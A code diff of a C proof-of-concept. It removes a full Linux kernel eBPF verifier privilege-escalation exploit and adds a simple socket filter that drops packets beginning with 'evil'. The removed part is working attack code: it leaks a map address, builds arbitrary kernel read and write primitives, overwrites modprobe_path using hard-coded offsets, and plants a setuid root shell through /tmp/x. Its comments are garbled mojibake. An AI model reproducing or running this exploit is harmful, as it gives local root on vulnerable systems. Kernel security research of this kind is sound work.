@@ -1,378 +1,116 @@
+/* poc.c */
 #include <linux/bpf.h>
+#include <stddef.h>        // offsetof
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <socket.h>
 #include <string.h>
+#include <unistd.h>
 #include <sys/socket.h>
 #include <sys/syscall.h>
-#include <sys/types.h>
-#include <unistd.h>
+#include <errno.h>
 #include "bpf_insn.h"
 
-#define ofs_array_map_ops 0xc124a0
-#define ofs_modprobe_path 0xe37fe0
+#define LOG_BUF_SZ (1 << 16)
 
 void fatal(const char *msg) {
-  perror(msg);
-  exit(1);
+    perror(msg);
+    exit(1);
 }
 
-int bpf(int cmd, union bpf_attr *attrs) {
-  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
-}
+int main(void) {
+    /* 1) BPF 프로그램 자체 (시작 4바이트 == "evil" 인지 검사) */
+    struct bpf_insn prog[] = {
+        /* 0: len = ctx->len */
+        BPF_LDX_MEM(BPF_W, BPF_REG_2, BPF_REG_1,
+                    offsetof(struct __sk_buff, len)),
+        /* 1: if (len < 4) goto allow;  offset = 16 */
+        BPF_JMP_IMM(BPF_JLT, BPF_REG_2, 4, 16),
 
-int map_create(int val_size, int max_entries) {
-  union bpf_attr attr = {
-    .map_type = BPF_MAP_TYPE_ARRAY,
-    .key_size = sizeof(int),
-    .value_size = val_size,
-    .max_entries = max_entries
-  };
-  int mapfd = bpf(BPF_MAP_CREATE, &attr);
-  if (mapfd == -1) fatal("bpf(BPF_MAP_CREATE)");
-  return mapfd;
-}
+        /* 2: skb_load_bytes(ctx, 0, fp-8, 4) */
+        BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_1),      // ctx
+        BPF_MOV64_IMM(BPF_REG_ARG2, 0),              // offset = 0
+        BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -8),    // &stack[-8]
+        BPF_MOV64_IMM(BPF_REG_ARG4, 4),              // len = 4
+        BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
+//
+        ///* 8: buf[0]=='e'?  if not goto allow (offset=18-(8+1)=9) */
+        BPF_LDX_MEM(BPF_B, BPF_REG_5, BPF_REG_FP, -8),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_5, 'e', 8),
+//
+        ///*10: buf[1]=='v'?  if not goto allow (offset=18-(10+1)=7) */
+        BPF_LDX_MEM(BPF_B, BPF_REG_5, BPF_REG_FP, -7),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_5, 'v', 6),
+//
+        ///*12: buf[2]=='i'?  if not goto allow (offset=18-(12+1)=5) */
+        BPF_LDX_MEM(BPF_B, BPF_REG_5, BPF_REG_FP, -6),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_5, 'i', 4),
+//
+        ///*14: buf[3]=='l'?  if not goto allow (offset=18-(14+1)=3) */
+        BPF_LDX_MEM(BPF_B, BPF_REG_5, BPF_REG_FP, -5),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_5, 'l', 2),
+//
+        ///*16: match → drop */
+        BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN(),
 
-int map_update(int mapfd, int key, void *pval) {
-  union bpf_attr attr = {
-    .map_fd = mapfd,
-    .key = (uint64_t)&key,
-    .value = (uint64_t)pval,
-    .flags = BPF_ANY
-  };
-  int res = bpf(BPF_MAP_UPDATE_ELEM, &attr);
-  if (res == -1) fatal("bpf(BPF_MAP_UPDATE_ELEM)");
-  return res;
-}
+        /*18: allow → pass */
+        BPF_MOV64_IMM(BPF_REG_0, -1),
+        BPF_EXIT_INSN(),
+    };
 
-int map_lookup(int mapfd, int key, void *pval) {
-  union bpf_attr attr = {
-    .map_fd = mapfd,
-    .key = (uint64_t)&key,
-    .value = (uint64_t)pval,
-    .flags = BPF_ANY
-  };
-  return bpf(BPF_MAP_LOOKUP_ELEM, &attr); // -1 if not found
-}
+	struct bpf_insn insns[] = {
+		BPF_MOV64_IMM(BPF_REG_0, 4),
+		BPF_EXIT_INSN(),
+	  };
 
-/**
- * �뉐츣�쀣걼mapfd�췇PF�욁긿�쀣궋�됥꺃�밤굮�ゃ꺖��
- */
-unsigned long leak_map_address(int mapfd) {
-  char verifier_log[0x10000];
-  unsigned long val;
+    /* 2) BPF 로드 준비 */
+    union bpf_attr attr = {
+        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+        .insn_cnt  = sizeof(prog) / sizeof(prog[0]),
+        .insns     = (uint64_t)prog,
+        .license   = (uint64_t)"GPL",
+        .log_level = 1,
+        .log_size  = LOG_BUF_SZ,
+    };
+    char *log_buf = malloc(LOG_BUF_SZ);
+    if (!log_buf) fatal("malloc");
+    attr.log_buf = (uint64_t)log_buf;
 
-  /* BPF�쀣꺆�겹꺀�� */
-  struct bpf_insn insns[] = {
-    // R0 --> &map[0]
-    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
-    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
-    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
-    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &k)
-    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
-    BPF_EXIT_INSN(),
+    /* 3) BPF 프로그램 로드 */
+    int prog_fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
+    if (prog_fd < 0) {
+        fprintf(stderr,
+                "BPF load failed: %s\nVerifier log:\n%s\n",
+                strerror(errno), log_buf);
+        exit(1);
+    }
+    free(log_buf);
 
-    // R1 --> var_off=(value=0; mask=0xffffffff00000000)
-    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0),
-    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 32),
-    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
-    // R2 --> var_off=(value=0xfffffffe00000001; mask=0)
-    BPF_MOV64_IMM(BPF_REG_2, 0xfffffffe),
-    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 1),
-    // R1 --> (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1
-    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),
+	printf("[*] log %s\n", attr.log_buf);
 
-    // R0 --> scalar
-    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),
-    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),
+    /* 4) 소켓 생성 및 필터 부착 */
+    int sv[2];
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) fatal("socketpair");
+    if (setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_BPF,
+                   &prog_fd, sizeof(prog_fd)) < 0) fatal("setsockopt");
 
-    // BPF�욁긿�쀣겗�㏂깋�с궧�믡꺁�쇈궚
-    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, -0x10),
-    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
-    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), // key
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
-    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), // value
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
-    BPF_MOV64_IMM(BPF_REG_ARG4, 0),          // flag
-    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), // map_update_elem
+    /* 5) 테스트: 시작 4바이트가 "evil" 이면 read() 에서 0이, 아니면 그대로 data */
+    const char *msgs[] = {       // drop
+        "he",    // pass
+		"Hello_world", //pass
+		"evilPacket" // drop
+    };
+    for (int i = 0; i < 3; i++) {
+        write(sv[1], msgs[i], strlen(msgs[i]));
+        char buf[64] = {};
+        int n = read(sv[0], buf, sizeof(buf));
+        printf("[%s] read returned %d,", msgs[i], n);
+        if (n > 0) printf(" data='%.*s'", n, buf);
+        printf("\n");
+    }
 
-    BPF_MOV64_IMM(BPF_REG_0, 0),
-    BPF_EXIT_INSN(),
-  };
-
-  /* �썬궞�껁깉�ⓦ겓鼇�츣 */
-  union bpf_attr prog_attr = {
-    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
-    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
-    .insns = (uint64_t)insns,
-    .license = (uint64_t)"GPL v2",
-    .log_level = 2,
-    .log_size = sizeof(verifier_log),
-    .log_buf = (uint64_t)verifier_log
-  };
-
-  /* BPF�쀣꺆�겹꺀�졼굮��꺖�� */
-  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
-  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");
-
-  /* �썬궞�껁깉�믢퐳�� */
-  int socks[2];
-  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
-    fatal("socketpair");
-  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
-    fatal("setsockopt");
-
-  /* �썬궞�껁깉�믣닶�⑨펷BPF�쀣꺆�겹꺀�졼겗�뷴땿竊� */
-  write(socks[1], "Hello", 5);
-
-  map_lookup(mapfd, 0, &val);
-  return val - 1;
-}
-
-/**
- * 餓삥꼷�㏂깋�с궧沃�겳渦쇈겳
- */
-unsigned long aar64(int mapfd, unsigned long addr) {
-  char verifier_log[0x10000];
-  unsigned long val;
-
-  val = 1;
-  map_update(mapfd, 0, &val);
-
-  /* BPF�쀣꺆�겹꺀�� */
-  struct bpf_insn insns[] = {
-    // R8 --> context
-    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),
-
-    // R0 --> &map[0]
-    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
-    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
-    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
-    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &k)
-    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
-    BPF_EXIT_INSN(),
-    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
-
-    // R1 --> var_off=(value=0; mask=0xffffffff00000000)
-    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, 0),
-    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 32),
-    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
-    // R2 --> var_off=(value=0xfffffffe00000001; mask=0)
-    BPF_MOV64_IMM(BPF_REG_2, 0xfffffffe),
-    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 1),
-    // R1 --> (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1
-    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),
-
-    // R2 --> (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / actual:1
-    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, 0),
-    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, 1, 2),
-    BPF_MOV64_IMM(BPF_REG_0, 0),
-    BPF_EXIT_INSN(),
-
-    // R1 --> 0 / actual: 1
-    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
-    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),
-    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),
-
-    // FP-0x18�ユ쐣�밤겒�앫궎�녈궭�믦Þ營� (*)
-    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x18),
-
-    // R1 --> 1 / actual: 0x10
-    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x10-1),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
-
-    // (*)�㎫뵪�뤵걮�잆궧�욍긿��툓��깮�ㅳ꺍�욍굮訝딀쎑�랃펷ALU sanitation��썮�울펹
-    BPF_MOV64_IMM(BPF_REG_ARG2, 0),              // arg2=offset (0)
-    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     // arg3=to (FP-0x20)
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),
-    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      // arg4=len (1/0x10)
-    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      // arg1=skb
-    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
-
-    // �멥걤�쎼걟�됥굦��(*)��깮�ㅳ꺍�욍굮�뽩풓
-    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x18),
-
-    // 餓삥꼷�㏂깋�с궧沃�겳�멥걤�뚦룾��
-    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0), // �썬깮�ㅳ꺍�욍걢�됭き�욤씔��
-
-    // �ゃ꺖��걮�잆깈�쇈궭�믡깺�쇈궣�쇘㈉�볝겎�쀣걨�뽧굥
-    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, -0x10),
-    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
-    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), // key
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
-    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), // value
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
-    BPF_MOV64_IMM(BPF_REG_ARG4, 0),          // flag
-    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), // map_update_elem
-
-    BPF_MOV64_IMM(BPF_REG_0, 0),
-    BPF_EXIT_INSN(),
-  };
-
-  /* �썬궞�껁깉�ⓦ겓鼇�츣 */
-  union bpf_attr prog_attr = {
-    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
-    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
-    .insns = (uint64_t)insns,
-    .license = (uint64_t)"GPL v2",
-    .log_level = 2,
-    .log_size = sizeof(verifier_log),
-    .log_buf = (uint64_t)verifier_log
-  };
-
-  /* BPF�쀣꺆�겹꺀�졼굮��꺖�� */
-  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
-  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");
-
-  /* �썬궞�껁깉�믢퐳�� */
-  int socks[2];
-  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
-    fatal("socketpair");
-  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
-    fatal("setsockopt");
-
-  /* �썬궞�껁깉�믣닶�⑨펷BPF�쀣꺆�겹꺀�졼겗�뷴땿竊� */
-  char payload[0x10];
-  *(unsigned long*)&payload[0] = 0x4141414141414141;
-  *(unsigned long*)&payload[8] = addr; // �ゃ꺖��걲�뗣궋�됥꺃��
-  write(socks[1], payload, 0x10);
-
-  map_lookup(mapfd, 0, &val);
-  return val;
-}
-
-/**
- * 餓삥꼷�㏂깋�с궧�멥걤渦쇈겳
- */
-unsigned long aaw64(int mapfd, unsigned long addr, unsigned long value) {
-  char verifier_log[0x10000];
-  unsigned long val;
-
-  val = 1;
-  map_update(mapfd, 0, &val);
-
-  /* BPF�쀣꺆�겹꺀�� */
-  struct bpf_insn insns[] = {
-    // R8 --> context
-    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),
-
-    // R0 --> &map[0]
-    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
-    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
-    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
-    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &k)
-    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
-    BPF_EXIT_INSN(),
-    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
-
-    // R1 --> var_off=(value=0; mask=0xffffffff00000000)
-    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, 0),
-    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 32),
-    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
-    // R2 --> var_off=(value=0xfffffffe00000001; mask=0)
-    BPF_MOV64_IMM(BPF_REG_2, 0xfffffffe),
-    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 1),
-    // R1 --> (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1
-    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),
-
-    // R2 --> (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / actual:1
-    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, 0),
-    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, 1, 2),
-    BPF_MOV64_IMM(BPF_REG_0, 0),
-    BPF_EXIT_INSN(),
-
-    // R1 --> 0 / actual: 1
-    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
-    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),
-    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),
-
-    // FP-0x18�ユ쐣�밤겒�앫궎�녈궭�믦Þ營� (*)
-    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x18),
-
-    // R1 --> 1 / actual: 0x10
-    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x10-1),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
-
-    // (*)�㎫뵪�뤵걮�잆궧�욍긿��툓��깮�ㅳ꺍�욍굮訝딀쎑�랃펷ALU sanitation��썮�울펹
-    BPF_MOV64_IMM(BPF_REG_ARG2, 0),              // arg2=offset (0)
-    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     // arg3=to (FP-0x20)
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),
-    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      // arg4=len (1/0x10)
-    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      // arg1=skb
-    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
-
-    // �멥걤�쎼걟�됥굦��(*)��깮�ㅳ꺍�욍굮�뽩풓
-    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x18),
-
-    // 餓삥꼷�㏂깋�с궧沃�겳�멥걤�뚦룾��
-    BPF_MOV64_IMM(BPF_REG_1, value >> 32),
-    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, value & 0xffffffff),
-    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0), // �썬깮�ㅳ꺍�욍겦��쎑�띹씔��
-
-    BPF_MOV64_IMM(BPF_REG_0, 0),
-    BPF_EXIT_INSN(),
-  };
-
-  /* �썬궞�껁깉�ⓦ겓鼇�츣 */
-  union bpf_attr prog_attr = {
-    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
-    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
-    .insns = (uint64_t)insns,
-    .license = (uint64_t)"GPL v2",
-    .log_level = 2,
-    .log_size = sizeof(verifier_log),
-    .log_buf = (uint64_t)verifier_log
-  };
-
-  /* BPF�쀣꺆�겹꺀�졼굮��꺖�� */
-  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
-  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");
-
-  /* �썬궞�껁깉�믢퐳�� */
-  int socks[2];
-  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
-    fatal("socketpair");
-  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
-    fatal("setsockopt");
-
-  /* �썬궞�껁깉�믣닶�⑨펷BPF�쀣꺆�겹꺀�졼겗�뷴땿竊� */
-  char payload[0x10];
-  *(unsigned long*)&payload[0] = 0x4141414141414141;
-  *(unsigned long*)&payload[8] = addr; // �멥걤�쎼걟�뗣궋�됥꺃��
-  write(socks[1], payload, 0x10);
-}
-
-int main() {
-  // BPF�욁긿�쀣굮鵝쒏닇
-  int mapfd = map_create(8, 1);
-
-  unsigned long addr_map = leak_map_address(mapfd);
-  printf("[+] addr_map = 0x%016lx\n", addr_map);
-
-  unsigned long addr_ops = aar64(mapfd, addr_map - 0x110);
-  printf("[+] ops = 0x%016lx\n", addr_ops);
-  unsigned long kbase = addr_ops - ofs_array_map_ops;
-  printf("[+] kbase = 0x%016lx\n", kbase);
-
-  // modprobe_path��쎑�띷룢��
-  aaw64(mapfd,
-        kbase + ofs_modprobe_path,
-        0x0000782f706d742f); // "/x"
-
-    system("echo '#!/bin/sh' > /tmp/x");
-    system("echo 'chown root:root /shell' >> /tmp/x");
-    system("echo 'chmod u+s /shell' >> /tmp/x");
-    system("chmod +x /tmp/x");
-  system("/dummy");
-
-  system("/shell");
-
-  return 0;
+    return 0;
 }
